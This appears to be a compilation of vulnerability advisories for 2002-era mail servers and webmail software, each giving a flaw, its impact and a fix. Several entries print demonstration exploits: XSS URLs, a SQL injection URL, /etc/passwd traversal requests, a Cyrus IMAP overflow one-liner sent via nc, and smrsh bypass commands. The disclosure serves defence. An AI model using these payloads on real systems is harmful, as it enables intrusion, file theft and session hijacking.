It is reported that a remote user can send a specially crafted e-mail message with a long attachment file name (252 characters) to a target user that has an account on a Hypermail system to trigger a buffer overflow.  The overflow can reportedly be triggered when Hypermail is in a certain configuration (option progress set to 2).  The overflow resides in the parsemail() function in the 'parse.c' file and allows the remote user to execute arbitrary code on the system with the privileges of the Hypermail process.

According to the report, there are other buffer overruns in the parsemail() function, but those may not be exploitable.

It is also reported that the 'mail' CGI component of Hypermail contains a flaw.  A buffer overflow can be triggered when a reverse DNS lookup is performed if the hostname returned is 122 characters.  A remote user with control of a DNS server or the ability to spoof the DNS can supply a specially crafted hostname value to cause arbitrary code to be executed by the mail CGI script.

Finally, the mail CGI program can also be invoked by remote users to send e-mail to arbitrary recipients.
Impact': A remote user can execute arbitrary code on the system with the privileges of the Hypermail system or with the privileges of the web server.  A remote user can send arbitrary e-mail to arbitrary recipients via the server.
Solution:
The vendor has released a fixed version (2.1.6), available at:

http://sourceforge.net/project/showfiles.php?group_id=18117&release_id=135937

The author of the report has indicated that, as a workaround, you can set the option progress to a value other than 2, configure Hypermail to not use the mail CGI program, and remove the mail CGI program from the web server's cgi-bin directory.

Title: Mailman List Software Input Validation Flaw in 'email' Variable Allows Remote Users to Conduct Cross-Site Scripting Attacks
Impact: Execution of arbitrary code via network
Description:
An input validation vulnerability was reported in the Mailman mailing list distribution software.  A remote user can conduct cross-site scripting attacks against Mailman users and administrators.
It is reported that the 'email' variable on the web interface is not properly filtered to remove HTML code from user-supplied input. A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the Mailman web interface and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.

A demonstration exploit URL is provided:

https://[target]:443/mailman/options/yourlist?
language=en&email=<SCRIPT>alert('Can%20Cross%20Site%20Attack')</SCRIPT>

It is also reported that the default error page does not properly filter user-supplied input.  A demonstration exploit URL is provided:

https://[target]:443//mailman/options/yourlist?
language=<SCRIPT>alert('Can%20Cross%20Site%20Attack')</SCRIPT>
Impact': A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the Mailmain software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.
Solution:
The vendor has issued a fix (xss-2.1.0-patch), available at:

http://sourceforge.net/project/showfiles.php?group_id=103

The vendor's advisory is available at:

http://mail.python.org/pipermail/mailman-announce/2003-January/000054.html

Title: Microsoft Outlook May Fail to Encrypt User E-mail, Disclosing the Contents to Remote Users
Description:
A vulnerability was reported in Microsoft Outlook 2002 in the use of V1 Exchange Server Security certificates for encryption.  The system may fail to encrypt user e-mail in a certain configuration.
It is reported that a flaw in Outlook 2002 may cause the contents of a user's HTML-based e-mail to be sent in plain text instead of being encrypted using V1 Exchange Server Security certificates for encryption.  The flaw is in the way in which Outlook 2002 processes a request to use a V1 Exchange Server Security certificate for encryption.

A remote user monitoring the network over which the e-mail was sent or with access to any of the e-mail servers that the mail traverses could view the plain text information.  The sender of the e-mail may not be aware that the e-mail was sent in unencrypted form.

It is reported that the vulnerability only affects HTML-based e-mail.  

Also, the system is not vulnerable when using S/MIME certificates (which is the default configuration), according to the vendor.  Digital signatures are not affected.

To determine the type of certificate Outlook 2002 is using for encryption, check the Tools|Options|Security|Security Settings menu. If the security settings indicate that the "secure message format" is "Exchange Server Security," then Outlook 2002 is using a V1 Exchange Server Security certificate and may be affected.
Impact': A remote user monitoring e-mail during transit or storage could view a target user's e-mail contents.
Solution:
The vendor has released the following patches for Microsoft Outlook 2002:

http://microsoft.com/downloads/details.aspx?FamilyId=F20A2E4B-E458-48F0-B0CB-7E73C0BB4884&displaylang=en

http://download.microsoft.com/download/0/3/d/03dcc183-a46e-4c22-9fbd-1fcb32f0fd91/Olk1006a.exe
(administrative update only)

The patch can be installed on Outlook 2002 with Office XP SP2.  The administrative update version of the patch can also be installed on Office XP SP1.

Microsoft plans to include this fix in any future service packs for Office XP.

Microsoft plans to issue Knowledge Base article 812262 regarding this issue, to be available shortly on the Microsoft Online Support web site:

http://support.microsoft.com/?scid=fh;en-us;kbhowto

Title: Horde IMP Mail Server Input Validation Holes May Let Remote Users Execute Commands on the Underlying Database Server
Impact: Execution of arbitrary code via network
Description:
A vulnerability was reported in the Horde Internet Messaging Program (IMP).  A remote user can inject SQL commands to be executed by the underlying database.
It is reported that the flaw resides in some of the database functions named lib/db.<databasename>. A remote user can submit specially crafted URLs that include SQL commands that will be executed by IMP's underlying database.  A demonstration exploit URL is provided:

"http://webmail.server/imp/mailbox.php3?actionID=6&server=x&imapuser=x';somesql+--&pass=x"

According to the report, the SQL query results are not displayed directly.
Impact': Depending on the SQL database configuration, a remote user may be able to execute complete SQL queries on the database and read from or write to the database.
Solution:
The vendor reportedly has indicated that the 2.2.x versions are not supported but that the vulnerability does not apply to the 3.x versions.

The updated version is available at:

http://horde.org/imp/

Title: CommuniGate Pro Input Validation Bug Lets Remote Users View Files on the System
Description:
An input validation vulnerability was reported in Stalker's CommuniGate Pro e-mail server.  A remote user can view certain files on the system.
It is reported that a remote user can send the following type of HTTP GET request to view files on the system that are readable by the server process:

GET /DomainFiles/*//../../../../etc/passwd HTTP/1.0
Impact': A remote user can view files on the system that are readable by the CommuniGate Pro process.
Solution:
The vendor has released a fixed version (4.0.3), available at:

http://www.stalker.com/download.html

Title: (Debian Issues Fix) Fetchmail Buffer Overflow in Processing Addresses Lets Remote Users Execute Arbitrary Code on the System
Impact: Execution of arbitrary code via network
Description:
A buffer overflow vulnerability was reported in Fetchmail.  A remote user could execute arbitrary code on the system.
e-matters reported that a remote user can send an e-mail containing a specially crafted header to trigger a heap overflow in Fetchmail. This may cause the fetchmail service to crash, or could cause arbitrary code to be executed on the system.

The flaw is reportedly due to an incorrect buffer size calculation.  According to the report, fetchmail allocates a buffer to contain addresses in an e-mail header.  The local addresses in the header are then appended with an '@' character and the mail server hostname and stored in the buffer.  The calculation reportedly fails to consider the '@' character in calculating the necessary buffer size.  Fetchmail also reportedly processes too many addresses.  The result is a potential heap overflow.
Impact': A remote user can execute arbitrary code on the target system.  This can occur when the target system's fetchmail process downloads a malicious e-mail message.  The code will run with the privileges of the fetchmail process.
Solution:
Debian has released a fix in version 5.9.11-6.2 of fetchmail and fetchmail-ssl.  For the old stable distribution (potato), the fix is in version 5.3.3-4.3.  For the current unstable distribution (sid), the fix is in version 6.2.0-1 of fetchmail and fetchmail-ssl.

Title: Captaris Infinite WebMail Server Input Validation Flaws Let Remote Users Conduct Cross-Site Scripting Attacks
Impact: Execution of arbitrary code via network
Version(s): 3.61.05; other versions may also be affected
Description: An input validation vulnerability was reported in the Captaris Infinite WebMail server. A remote user can conduct cross-site scripting attacks against Infinite WebMail users. It is reported that the server does not filter user-supplied input in certain HTML tags to remove scripting code. A remote user can send a specially crafted e-mail to a target user to cause arbitrary scripting code to be executed on the target user's computer. The code will run in the security context of the Infinite WebMail server. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user. Some demonstration exploit content is provided. The first example will execute when the target user opens the e-mail. The second example will execute when the target user places the mouse pointer over the text.
Impact': A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running Infinite WebMail, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.
Solution: No solution was available at the time of this entry.

Title: Open WebMail Input Validation Bug Lets Local Users and Certain Remote Users Execute Code With Root Privileges
Impact: Execution of arbitrary code via local system
Execution of arbitrary code via network
Description:
An input validation vulnerability was reported in Open WebMail.  A local user (or a remote user with the ability to upload files to the system) can obtain root access on the system.
It is reported that one of the Open WebMail Perl scripts contains a flaw that allows a local user to execute an arbitrary file on the system with root privileges.  If a remote user can upload two files to the system using some method (e.g., FTP, message board), then a remote user can execute code in the file with root privileges.

The 'openwebmail-abook.pl' script, which is run with set user id (setuid) root privleges, calls the 'openwebmail-shared.pl' script.  A remote user can pass an arbitrary value as the 'sessionid' to write the value to the $loginname variable.  The arbitrary value can contain '../' directory traversal characters.  An example exploit value is provided:

"../../../../../home/ftp/incoming/attacker.conf"

This value will be mapped to the $siteconf variable, which is intended to represent a path to the user's custom configuration file on the server.  The readconf() function will read in and process the specified file ('attacker.conf' in this example).  Some demonstration exploit 'attacker.conf' file contents are provided:

auth_module     /home/ftp/incoming/exploit.pl

This will cause the user's 'exploit.pl' script to be executed with root privileges.
Impact': A local user can execute arbitrary Perl code on the system with root privileges.  A remote user with the ability to upload files to any location on the server can also execute arbitrary Perl code with root privileges.
Solution:
The vendor has issued a fix.  Patches are available for the 1.7x and 1.8x versions at:

http://openwebmail.org/openwebmail/download/cert/patches/SA-02:01/

The most recent version is available at:

http://openwebmail.org/openwebmail/download/openwebmail-current.tgz

Title: SquirrelMail Input Validation Flaw in 'read_body.php' Lets Remote Users Conduct Cross Site Scripting Attacks
Impact: Execution of arbitrary code via network
Description:
An input validation vulnerability was reported in a component of SquirrelMail.  A remote user can conduct cross-site scripting attacks against SquirrelMail users.
It is reported that the 'read_body.php' script does not filter user-supplied HTML from the 'mailbox' and 'passed_id' variables. A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the SquirrelMail software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user. 

A demonstration exploit is provided:

http://hostname/src/read_body.php?mailbox=
%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E&passed_id=
%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E&
startMessage=1&show_more=0
Impact': A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running SquirrelMail, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.
Solution: No solution was available at the time of this entry.

Title: Exim Mail Server Format String Bug Lets Local Exim Administrators Execute Arbitrary Code With Root Privileges
Impact: Execution of arbitrary code via local system
Description:
A format string vulnerability was reported in the Exim mail server.  A local Exim administrative user can execute arbitrary code with root level privileges.
It is reported that there is a format string vulnerability in the daemon_go() function in daemon.c (on line 976), where 'pid_file_path' is printed without proper formatting strings.  This value can reportedly be changed by the local user via the command line.  However, only an 'exim-admin-user' can execute the vulnerable function to trigger the flaw.

A demonstration exploit script is provided in the Source Message.
Impact': A local user with 'exim-admin-user' privileges can execute arbitrary code on the server with root privileges.
Solution: No solution was available at the time of this entry.  The vendor is reportedly working on a patch.

Title: (Vendor Issues Fix) Re: Mojo Mail Input Validation Flaw in Sign-Up Form Lets Remote Users Conduct Cross-Site Scripting Attacks
Impact: Execution of arbitrary code via network
Description:
An input validation vulnerability was reported in Mojo Mail, a mailing list manager.  A remote user can conduct cross-site scripting attacks against Mojo Mail users.
It is reported that Mojo Mail does not properly filter HTML from user-supplied inputs during sign-up requests.

A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the Mojo Mail software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user. 

A demonstration exploit URL is provided:

http://[target host]/cgi-bin/mojo/mojo.cgi?flavor=subscribe&email=%
3Cscript%3Ealert%28%22XSS%20Vuln.%22%29%3C%2Fscript%
3E&list=skazat_design_newsletter&submit=Submit
Impact': A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the Mojo Mail software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.
Solution:
The vendor has released a fixed version (2.7.1 beta), available at:

http://sourceforge.net/projects/mojomail/

The vendor states that a stable release will be available soon.

Title: Sendmail 'check_relay' E-mail Access Control Features Can Be Bypassed By Remote Users
Description:
An access control vulnerability was reported in Sendmail.  A remote user with the ability to control a DNS server or spoof the DNS may be able to bypass a target server's sendmail access controls and send mail to or via that server.
It is reported that a remote user can bypass the access restrictions imposed via the 'check_relay' function by using bogus domain name system (DNS) data.  It appears that a remote user with control of a DNS server can supply a blank client name via DNS to cause the 'check_relay' hostname access controls to fail to block mail from that domain.

Sendmail.org credits Kai Schlichting with reporting this flaw.
Impact': A remote user with ability to spoof the DNS can bypass sendmail access restrictions and send mail to or via the server.
Solution:
The vendor has released the following patches.

For 8.12:

  http://www.sendmail.org/patches/proto.m4.8.649.2.13

For 8.9:

  http://www.sendmail.org/patches/proto.m4.8.9.3

According to the vendor version 8.12.7 will contain a patch to correct this flaw.

Also, if your system is configured to use the FEATURE(`delay_checks'), then the vendor says that you do not need a patch.

Title: Cyrus IMAP Server Buffer Overflow Lets Remote Users Execute Arbitrary Code
Impact: Execution of arbitrary code via network
Description:
A buffer overflow was reported in the Cyrus IMAP Server.  A remote user can execute arbitrary code on the server.
It is reported that the software does not verify literal lengths in user-supplied data.

A demonstration exploit transcript is provided:

perl -e 'print "x login {4294967295}\r\n\xf0\xef\xff\xbf\x90\xef\xff\xbf\xfc\xff\xff\xff\xfc\xff\xff\xff";'|nc localhost imap2
<ctrl-c>

The vendor has reportedly been notified.
Impact': A remote user can execute arbitrary code on the target system with the privileges of the IMAP server.
Solution: No solution was available at the time of this entry.  An unofficial patch is provided in the Source Message.

Title: Cyrus IMAP Server 'Sieve' Buffer Overflows Let Local Users Gain Elevated Privileges
Impact: Execution of arbitrary code via local system
Version(s): Cyrus IMAP 2.1.10 and prior versions (libSieve 2.1.2 and prior versions)
Description:
Several buffer overflows were reported in the Cyrus IMAP Server's implementation of the Sieve mail filtering language.  A local user can execute arbitrary code to gain elevated privileges on the system.
It is reported that a local user can supply the Sieve script with a specially crafted value (> 100 characters of a corrupted header name, > 100 characters of an IMAP flag, or a script containing many errors to result in an error message that exceeds the 500 character limit) to cause arbitrary code to be executed on the system.
Impact': A local user can execute arbitrary code with the privileges of the Cyrus user account.  This can allow the user to read all user mail on the system.
Solution: No solution was available at the time of this entry.  An unofficial patch is available in the Source Message.

Title: Open WebMail Discloses User and Group Account ID Information to Remote Users
Description:
An information disclosure vulnerability was reported in Open WebMail.  A remote user can determine the user id and group id of the WebMail scripts.
It is reported that a remote user can connect to the server and enter an invalid username to cause the server to disclose some internal system information.  According to the report, the server will disclose the user id (uid) and group id (gid) of the Open WebMail process, such as is shown below:

euid=0, egid=80 80 80, mailgid=6
Impact': A remote user can determine the user id and group id of the Open WebMail process on the server.
Solution: No solution was available at the time of this entry.

Title: MailEnable POP Mail Server Buffer Overflow Lets Remote Users Crash the Server or Execute Arbitrary Code
Impact: Execution of arbitrary code via network
Description:
A buffer overflow vulnerability was reported in the MailEnable POP e-mail server.  A remote user can cause the POP service to crash or possibly execute arbitrary code.
It is reported that a remote user can send a long string of characters as the USER field to the POP server to cause the service to shut down.  All current connections will be dropped.  No further connections are processed.

The server will reportedly log that an invalid command has been supplied but does not indicate that the service is shutting down.

Another user reports that it is possible for a remote user to execute arbitrary code on the server.
Impact': A remote user can cause the POP service to crash or cause the server to execute arbitrary code.
Solution: No solution was available at the time of this entry.

Title: (Vendor Issues Fix) Re: Gordano GMS Mail (NTMail) 'JUCE' Mail Filter Fails to Properly Block Mail
Description:
A vulnerability was reported in the Gordano GMS Mail (NTmail) e-mail server software.  The software may allow some e-mail to bypass the 'JUCE' SPAM filter.
It is reported that when the system processes inbound e-mail containing multiple recipients and is configured with the JUCE mail filter add-on to block certain keywords, the system will only block mail to the first reciepient.  Other receipients will receive the mail.

The vendor has reportedly been notified.
Impact': A remote user can send e-mail that will bypass the SPAM keyword filter.
Solution:
The vendor has issued a patch as a hotfix to the 3078 release, available at:

ftp://ftp.gordano.com/GMS/hotfixes/h20021119/intel/smtp_h20021119.zip

For more information, see the vendor's knowledge base article at:

http://www.gordano.com/kb.htm?q=1709

Title: (Debian Issues Fix) nullmailer Bug Lets Remote Users Crash the Service
Description:
A denial of service vulnerability was reported in the 'nullmailer' mail relay software.  A remote user could cause the software to halt.
It is reported that when mail is destined for a local user account that does not exist, nullmailer will attempt to deliver the mail. When nullmailer subsequently receives a user unknown error message, nullmailer will stop delivering all mail messages.
Impact': A remote user can cause nullmailer to stop delivering messages.
Solution:
Debian has released a fix in version 1.00RC5-16.1woody2 for the current stable distribution (woody) and in version 1.00RC5-17 for the unstable distribution (sid).

Title: (Debian Issues Fix) Courier SqWebMail Privilege Dropping Bug Lets Local Users View Files on the System
Description:
A vulnerability was reported in Courier SqWebMail.  A local user could view files on the system with elevated privileges.
It is reported that the software does not drop root permissions fast enough when starting up under certain circumstances, due to a flaw in 'sqwebmail.c'.  A local user could exploit this to view arbitrary files on the system.
Impact': A local user could view files on the system with root privileges.

Title: IISPop EMail Server Can Be Crashed By Remote Users
Description:
A denial of service vulnerability was reported in the IISPop EMail Server.  A remote user can cause the server to crash.  Securma Massine reported this flaw.
A remote user can send a long string (289999 byte) to the POP3 mail server to cause the mail server to crash.

A demonstration exploit script is provided in the Source Message.
Impact': A remote user can cause the POP3 mail service to crash.
Solution: No solution was available at the time of this entry.

Title: (Debian Issues Fix) MasqMail Server Buffer Overflows Let Local Users Grab Root Privileges
Impact: Execution of arbitrary code via local system

Title: (FreeBSD Issues Fix) Sendmail Restricted Shell (smrsh) May Let Local Users Bypass Restrictions to Execute Code
Impact: Execution of arbitrary code via local system
Description:
A vulnerability was reported in the Sendmail restricted shell (smrsh) utility.  A local user may be able to bypass smrsh access restrictions and execute a user-specific binary on the system.
iDEFENSE reported that a local user can insert a special character sequence into their '.forward' file to exploit the flaw.

One method is to insert the '||' string, as shown in the demonstration exploit transcript below:

$ echo "echo unauthorized execute" > /tmp/unauth
$ smrsh -c ". || . /tmp/unauth || ." 
  /bin/sh: /etc/smrsh/.: is a directory
  unauthorized execute

According to the report, smrsh will verify that the '.' exists but does not perform verification on files listed after the '||' string, so /tmp/unauth is executed even though it is not located within the '/etc/smrsh' restricted directory.  To exploit this, the local user can place the following line in the '.forward' file:

"| . \|| . /tmp/unauth \|| ."

Another method is to provide a command line to smrsh that will be internally converted to a space, thereby bypassing all access filters.  Some examples include:

    smrsh -c "/ command"
    smrsh -c "../ command"
    smrsh -c "./ command"
    smrsh -c "././ command"

iDEFENSE credits zen-parse and Pedram Amini with reporting this flaw.
Impact': A local user can bypass smrsh restrictions and execute arbitrary commands on the system.
Solution:
FreeBSD has released a fix and has provided the following solution:

1) Upgrade your vulnerable system to 4.7-STABLE; or to the RELENG_4_7, RELENG_4_6, RELENG_4_5, RELENG_4_4, or RELENG_4_3 security branch dated after the correction date.

2) To patch your present system:

The following patch has been verified to apply to FreeBSD 4.4, FreeBSD 4.5, and FreeBSD 4.6 systems.

a) Download the relevant patch from the location below, and verify the detached PGP signature using your PGP utility.

# fetch ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-02:41/smrsh.patch
# fetch ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/patches/SA-02:41/smrsh.patch.asc

b) Execute the following commands as root:

# cd /usr/src
# patch < /path/to/patch
# cd /usr/src/usr.sbin/sendmail
# make depend && make && make install

Title: W3Mail Input Validation Flaw in viewAttachment.cgi Lets Remote Authenticated Users View Files on the System
Description:
An input validation vulnerability was reported in W3Mail.  A remote authenticated user can view files located outside of the web document directory.
It is reported that, in fixing a previously reported flaw, the vendor introduced a new flaw.  A remote authenticated user can invoke a script with a specially crafted file argument to view files located anywhere on the server that are readable by the web server daemon.

As part of a fix for a previously reported flaw, the vendor reportedly moved the MIME attachments directory out of the document root directory.  However, the newly introduced 'viewAttachment.cgi' contains a flaw, according to the report.  A remote authenticated user can supply the following type of filename to the CGI to view arbitrary files on the server (the files must be readable by the web daemon):

file=../../../../../etc/passwd

The vendor has reportedly been notified.
Impact': A remote authenticated user can view files on the server that are readable by the web daemon.
Solution: No solution was available at the time of this entry.
Underlying OS Comments: [It is not clear if NT is affected or not]

Title: Incognito Software iSMTP Gateway for Banyan VINES Lets Remote Users Crash the Server
Description:
A buffer overflow vulnerability was reported in Incognito Software's iSMTP Gateway for Banyan VINES.  A remote user can cause the server to crash.
Network Intelligence India reported that a remote user can send a long 'MAIL FROM:' command to cause the server to respond with a 'Command Unrecognised' response and then crash.

The exact length of the string required to crash the software is not known.  However, a string of approximately 4000 'A' characters was observed to trigger the flaw.
Impact': A remote user can cause the server to crash.
Solution:
No solution was available at the time of this entry.  However, the report states that the vendor has been unable to replicate the error in the latest version of the software.  The latest version is available at:

ftp://ftp.incognito.com

Title: (Vendor Issues Fix) Re: Kerio MailServer Allows Remote Users to Deny Service and Also Conduct Cross-Site Scripting Attacks
Impact: Execution of arbitrary code via network
Description:
Several vulnerabilities were reported in the Kerio MailServer.  A remote user can cause the mail server to become unavailable and can also conduct cross-site scripting attacks against mail server users.
NSSI-Research Labs issued an advisory warning of several flaws in the Kerio MailServer.

A remote user can sending multiple TCP SYN packets to all active services on the mail server (POP3, SMTP, IMAP, Secure IMAP, POP3S, Web-mail, Secure Web-mail) to stop the mail server from responding to requests.  According to the report, only 5 TCP SYN packets are requred.  This will cause the system to consume all available resources on the system for several minutes.  After that, the service will apparently return to normal operations.

It is also reported that several of the pages on the web mail portion of the system allow a remote user to conduct cross-site scripting attacks against Kerio users.  A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will appear to originate from the mail server's web-mail interface and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.

The following pages are affected:

http://<kerio webmail>/login
http://<kerio webmail>/search
http://<kerio webmail>/settings
http://<kerio webmail>/new
http://<kerio webmail>/list
http://<kerio webmail>/logout

The vendor has reportedly been notified.
Impact':
A remote user can cause the MailServer's services to stop responding to requests for a period of several minutes.

A remote user can access the target user's cookies (including authentication cookies), if any, associated with the web-mail server, access data recently submitted by the target user via web form to the server, or take actions on the server acting as the target user.
Solution:
The vendor has issued a fixed version (5.1.7), as of October 22, 2002.  Contact the vendor to upgrade:

http://www.kerio.com/

Title: SmartMail Server E-Mail Server Can Be Crashed By Remote Users
Description:
A denial of service vulnerability was reported in Virtualzone's SmartMail Server e-mail server.  A remote user can cause the mail services to crash.
It is reported that a remote user can open a connection to the mail server on port 25 and then close the connection while sending data to trigger an access violation in 'smartsvr.exe'.  A demonstration exploit script is included in the Source Message.

A remote user can also reportedly send 5 MB of data to the mail server on port 25 or 110 to cause the mail server services to shutdown (this bug applies to the older version of the software).  A demonstration exploit script is provided in the Source Message.
Impact': A remote user can cause the mail services to crash.
Solution: No solution was available at the time of this entry.

Title: Mailread.com POP Mail Software Input Validation Bugs Let Remote Users Read Files and Execute Commands on the System
Impact: Execution of arbitrary code via network
Description:
Two vulnerabilities were reported in the Mailreader.com POP mail viewer.  A remote user can read files and execute arbitrary commands on the system.
SCAN Associates reported that the product contains multiple input validation flaws.  A remote user can use null byte poisoning to overwrite the 'configLanguage' value to display arbitrary files on the system that are readable by the web server [CVE: CVE-2002-1581].  A demonstration exploit URL is provided:

http://192.168.0.1/cgi-bin/mail/nph-mr.cgi?do=loginhelp&configLanguage=../..
/../../../../../etc/passwd%00

It is reported that a remote user can also overwrite the 'configSMTPServers' value in version 2.3.30 and 2.3.31 to specify sendmail as the mail transfer agent.  According to the report, the 'compose.cgi' script does not properly filter the $CONFIG{RealEmail} variable and uses the '$from' variable that is specified in the 'network.cgi' script.  A remote user can send a specially crafted value to execute arbitrary shell commands with the privileges of the web daemon [CVE: CVE-2002-1582].
Impact': A remote user can read files on the system that are readable by the web server.  A remote user can execute arbitrary shell commands on the system with the privileges of the web daemon.
Solution:
The vendor has released a fixed version (2.3.33), available at:

http://www.mailreader.com/download/

Title: Alt-N MDaemon POP Mail Server Lets Remote Authenticated Users Crash the Mail Services
Description:
A denial of service vulnerability was reported in Alt-N's MDaemon mail server.  A remote authenticated user can send specially crafted commands to the POP server to kill the MDaemon mail server process.
It is reported that a remote authenticated user can send the DELE or UIDL commands with long arguments (32 bytes and longer) to cause all of MDaemon's services to close.

A demonstration exploit script is provided in the Source Message.
Impact': A remote authenticated user can cause the MDaemon mail services to crash.
Solution: No solution was available at the time of this entry.

Title: vpopmail-CGIApps Input Validation Flaws Let Remote Users Execute Arbitrary Commands on the Server
Impact: Execution of arbitrary code via network
Description:
An input validation vulnerability was reported in vpopmail-CGIApps, a password changing CGI script for vpopmail.  A remote user can execute arbitrary commands on the server.
Centaura Technologies reported that a remote user can provide specially crafted data in the password field or the domain form field to execute arbitrary commands on the server.  The flaw is due to insufficient input filtering before a call is made to the os.system() function.  User-supplied input can be passed to the shell.  The commands will run with the privileges of the script (normally 'vpopmail' user privileges).

The remote user can also add, modify, and delete accounts and domains from the database.

Impact': A remote user can execute arbitrary commands on the system with the privileges of the CGI script.
Solution:
The vendor has released a fixed version (0.3), available at:

ftp://ftp.buscadoc.org/pub/programas/vpopmail-CgiApps_0.3.tgz

However, another user (Jeremy C. Reed) reports that this fix may be only a partial fix.  Apparently, the fix does not filter out the backtick character and possibly other characters.
